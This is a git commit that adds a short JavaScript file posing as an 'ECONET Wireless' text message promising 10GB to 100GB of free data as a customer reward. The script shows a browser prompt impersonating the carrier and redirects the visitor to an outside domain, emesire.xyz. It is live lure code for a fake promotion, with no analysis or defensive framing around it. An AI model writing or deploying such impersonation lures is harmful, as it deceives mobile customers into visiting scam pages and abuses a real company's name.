ec7c0cc821829e897eaec86c1f06d6ab6c06627a
sureoffer <emesire247@gmail.com>
2025-06-11 09:33:37 -0700

    Create activation-freedata-10GB-100GB.js

---
+++ activation-freedata-10GB-100GB.js
@@ -0,0 +1,5 @@
+var password = 'GET FREE DATA'
+password=prompt('ECONET Wireless SMS: Dear Valued Customer, Kindly Check If your ECONET WirelessSim Card Is Qualify To Receive From 10GB To 100GB data, Valued Customers Reward, press Get Free Data To Check Now ','GET FREE DATA');
+if (password != 'GET FREE DATA') {
+location.href='https://emesire.xyz/freedata-10GB-100GB.html';
+}
